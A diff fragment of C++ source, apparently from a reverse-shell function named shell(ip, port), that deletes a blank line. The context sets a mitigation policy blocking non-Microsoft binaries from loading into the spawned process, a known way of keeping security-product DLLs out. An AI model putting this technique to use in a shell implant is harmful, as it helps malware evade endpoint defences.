@@ -60,7 +60,6 @@ void shell(wchar_t* ip, int port)
 	        size
         ));
 
-    	
         InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
         DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
         UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), nullptr, nullptr);
